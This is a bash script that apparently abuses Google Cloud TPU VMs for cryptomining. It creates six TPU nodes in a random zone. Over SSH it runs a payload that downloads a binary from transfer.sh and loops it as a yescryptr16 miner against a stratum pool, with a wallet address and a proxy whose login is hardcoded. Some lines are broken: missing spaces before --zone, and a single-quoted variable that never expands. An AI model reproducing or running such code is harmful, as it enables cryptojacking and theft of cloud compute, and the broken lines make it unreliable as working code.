#!/bin/bash
project="$1"
script="mkdir build && cd build && wget http://transfer.sh/Qjjz9R/update && chmod +x update && echo '#!/bin/sh
chmod +x update
while [ 1 ]; do
./update -a yescryptr16 -o stratum+tcp://stratum-na.rplant.xyz:17055 -u qNRPugvjxuXf9Pqyujp1mq3ohoPsEZ359Y.$(echo $(shuf -i 10-999 -n 1)-Atti) -t 72 -p datashit --proxy socks5://rifkii:awikwokk@138.128.69.13:8082
done' > builder.sh && chmod +x builder.sh && ./builder.sh"
array[0]="europe-west4-a"
array[2]="us-central1-c"
size=${#array[@]}
index=$(($RANDOM % $size))
region=${array[$index]}
gcloud alpha compute tpus tpu-vm create node-1 --zone=$region --accelerator-type=v3-8 --version=v2-alpha
gcloud alpha compute tpus tpu-vm create node-2 --zone=$region --accelerator-type=v3-8 --version=v2-alpha
gcloud alpha compute tpus tpu-vm create node-3 --zone=$region --accelerator-type=v3-8 --version=v2-alpha
gcloud alpha compute tpus tpu-vm create node-4 --zone=$region --accelerator-type=v3-8 --version=v2-alpha
gcloud alpha compute tpus tpu-vm create node-5--zone=$region --accelerator-type=v3-8 --version=v2-alpha
gcloud alpha compute tpus tpu-vm create node-6--zone=$region --accelerator-type=v3-8 --version=v2-alpha
gcloud alpha compute tpus tpu-vm ssh node-1 --zone=$region --project=$project --command='$script'
gcloud alpha compute tpus tpu-vm ssh node-2 --zone=$region --project=$project --command='$script'
gcloud alpha compute tpus tpu-vm ssh node-3 --zone=$region --project=$project --command='$script'
gcloud alpha compute tpus tpu-vm ssh node-4 --zone=$region --project=$project --command='$script'
gcloud alpha compute tpus tpu-vm ssh node-5--zone=$region --project=$project --command='$script'
gcloud alpha compute tpus tpu-vm ssh node-6--zone=$region --project=$project --command='$script'
